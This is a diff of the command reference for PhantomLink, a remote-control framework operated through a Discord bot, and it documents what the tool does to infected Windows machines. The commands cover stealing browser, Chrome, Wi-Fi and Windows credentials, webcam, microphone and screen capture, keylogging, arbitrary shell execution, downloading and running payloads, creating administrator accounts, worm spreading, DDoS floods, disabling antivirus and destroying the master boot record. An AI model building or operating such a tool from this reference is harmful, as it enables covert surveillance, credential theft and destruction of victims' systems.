@@ -1,122 +1,93 @@
 # PhantomLink Quick Commands
 
-This document contains all the quick (non-CMD) commands available in the PhantomLink C2 Framework.
+This document contains all commands available in the PhantomLink C2 Framework and Discord Bot interface.
+
+> [!NOTE]
+> Discord Bot supports native **Discord Slash Commands (`/`)** with auto-complete menus as well as legacy `!` prefix fallback.
 
 ---
 
-## File Operations
+## Discord Bot Slash Commands (`/`)
 
-| Command | Description |
-| :--- | :--- |
-| **send** | Make the client send files to the host |
-| **get** | Download file/s on the client from the host's server |
-| **copy** | Copy file |
-| **cut** | Move file from one place to another |
-| **extract** | Extract a .rar file to a location |
-| **archive** | Compress a file/folder into .zip |
-| **harvest** | Auto-search and send specific file types in User-file |
+When typing `/` in Discord, the command menu will auto-complete with parameter options and descriptions.
 
----
-
-## Media
-
-| Command | Description |
-| :--- | :--- |
-| **screenshot** | Take Screenshot and send it to the host |
-| **camera** | Take a snapshot from the camera and send it to the host |
-| **record** | Record audio from the client and send it to the host |
-| **play** | Play an audio in the client's speaker |
-| **rickroll** | Play a Rickroll video |
-| **screenrec** | Record screen as a video and send it |
+| Slash Command | Usage | Description |
+| :--- | :--- | :--- |
+| **/commands** | `/commands` | Displays the full list of all commands |
+| **/clients** | `/clients` | List all connected C2 clients |
+| **/select** | `/select <id>` | Select target client ID (or `all`) |
+| **/ping** | `/ping` | Test bot connectivity |
+| **/cmd** | `/cmd <command>` | Run arbitrary shell command on client |
+| **/broadcast** | `/broadcast <command>` | Send command to all connected clients |
 
 ---
 
-## Network & Internet
+## Quick Commands Matrix
 
-| Command | Description |
-| :--- | :--- |
-| **wifi** | Shows the wifi passwords |
-| **ip** | Get the client's Public IP |
-| **port** | Open a new Port-Forwarding |
-| **hosts** | Open hosts file to block / unblock websites |
-| **netscan** | Scan local network for devices and information |
-| **worm** | Inject PhantomLink into all PCs on the network |
-| **ddos** | DDOS on specific target |
-| **dnshijack** | Forward any connection to URL into another IP |
-| **sniff** | Capture all network traffic for specific duration |
+### File Operations
 
----
-
-## System Info & Monitoring
-
-| Command | Description |
-| :--- | :--- |
-| **sys** | Shows all system info (Hardware/Software) |
-| **task** | Shows all of the running tasks |
-| **devices** | Shows the available devices |
-| **clipboard** | Show the last copied thing |
-| **browser** | Extract all browser data (includes: Passwords, Usernames/E-Mails, Cookies) |
-| **info** | Get all machine info |
-| **creds** | Get all windows credentials |
-| **chrome_pass** | Decrypt Chrome's encrypted passwords |
+| Command | Usage | Description |
+| :--- | :--- | :--- |
+| **/send** | `/send <filepath>` | Send client file to Discord |
+| **/get** | `/get <url> <dest_path>` | Download file from URL to client |
+| **/copy** | `/copy <src> <dst>` | Copy file or directory |
+| **/cut** | `/cut <src> <dst>` | Move file or directory |
+| **/extract** | `/extract <archive_path> <dest>` | Extract archive (.zip, .rar, .7z) |
+| **/archive** | `/archive <folder_path> <zip_dest>` | Compress folder into .zip |
+| **/harvest** | `/harvest <extension>` | Auto-search and extract files by extension (e.g. pdf, docx) |
 
 ---
 
-## System Control
+### Media & Surveillance
 
-| Command | Description |
-| :--- | :--- |
-| **sleep** | Put client machine to sleep |
-| **logoff** | Log off the current user |
-| **lock** | Lock client screen |
-| **shutdown** / **off** | Force Shutdown to the client |
-| **restart** | Force restart to the client |
-| **rotate** | Rotate the client's screen |
-| **wallpaper** | Change wallpaper of client's computer |
-| **block** | Temporarily block mouse and keyboard input |
-| **disable task manager** | Disable the Task Manager |
-| **enable task manager** | Enable the Task Manager |
-| **killav** | Disable Windows Defender Anti-Virus |
-| **mouse** | Control mouse |
-| **type** | Control Keyboard |
-| **spam** | Show pop up repeatedly |
-| **killmbr** | Destructive: Destroy the PC master boot record |
+| Command | Usage | Description |
+| :--- | :--- | :--- |
+| **/screenshot** | `/screenshot` | Take screenshot and send to Discord/C2 |
+| **/camera** | `/camera <device_name>` | Take snapshot from webcam |
+| **/record** | `/record <seconds>` | Record audio from microphone |
+| **/play** | `/play <audio_path>` | Play audio file on client speaker |
+| **/screenrec** | `/screenrec <seconds>` | Record screen video |
 
 ---
 
-## User & Execution
+### Network & Infrastructure
 
-| Command | Description |
-| :--- | :--- |
-| **user** | Create an Admin user |
-| **inject** | Download and execute a malware/software |
-| **alert** | Send a POP-UP custom alert message |
-| **kill** | Kill the PC temporarily (until restart) |
-
----
-
-## Utilities
-
-| Command | Description |
-| :--- | :--- |
-| **recycle** | Empty the recycle bin |
-| **ffmpeg** | Download and setup ffmpeg |
-| **keylogger** | Download and setup KeyLogger |
-| **keylog** | Get the KeyLogger's log file |
+| Command | Usage | Description |
+| :--- | :--- | :--- |
+| **/wifi** | `/wifi` | Extract saved Wi-Fi profiles & passwords |
+| **/netscan** | `/netscan` | Scan local IPv4 subnet for devices |
+| **/port** | `/port <port_number>` | Open firewall port |
+| **/hosts** | `/hosts block/unblock <domain>` | Block or unblock website in hosts file |
+| **/ddos** | `/ddos <target_url> <seconds>` | Send HTTP flood requests to target |
+| **/sniff** | `/sniff <seconds>` | Capture network packet trace (.etl) |
+| **/worm** | `/worm` | Propagate client payload across local network |
 
 ---
 
-## Help & Management
+### System Info & Credentials
 
-| Command | Description |
-| :--- | :--- |
-| **commands** | Shows this help list of quick NON-CMD commands |
-| **update** | Update PhantomLink |
+| Command | Usage | Description |
+| :--- | :--- | :--- |
+| **/info** | `/info` | Gather system OS, CPU, RAM, disk, and hardware specs |
+| **/browser** | `/browser` | Extract browser history, logins, and cookies |
+| **/chrome_pass** | `/chrome_pass` | Decrypt Chrome saved passwords |
+| **/sys** | `/sys` | Detailed hardware and OS information |
 
 ---
 
-## Danger Zone
+### System Control & Interaction
 
-| Command | Description |
-| :--- | :--- |
-| **selfdestruct** | Remove PhantomLink completely from the client |
+| Command | Usage | Description |
+| :--- | :--- | :--- |
+| **/rotate** | `/rotate up/down/left/right` | Rotate screen orientation |
+| **/wallpaper** | `/wallpaper <image_path>` | Change desktop wallpaper |
+| **/type** | `/type <text>` | Type text on client keyboard |
+| **/alert** | `/alert <message>` | Display popup alert dialog |
+| **/block** | `/block <seconds>` | Temporarily block mouse & keyboard input |
+| **/spam** | `/spam <count> <message>` | Display popup dialogs repeatedly |
+| **/user** | `/user <username> <password>` | Create Windows administrator account |
+| **/inject** | `/inject <url>` | Download and execute payload |
+| **/logoff** | `/logoff` | Log off current Windows user |
+| **/disable_taskmgr** | `/disable_taskmgr` | Disable Task Manager |
+| **/enable_taskmgr** | `/enable_taskmgr` | Enable Task Manager |
+| **/selfdestruct** | `/selfdestruct` | Remove PhantomLink completely from client |
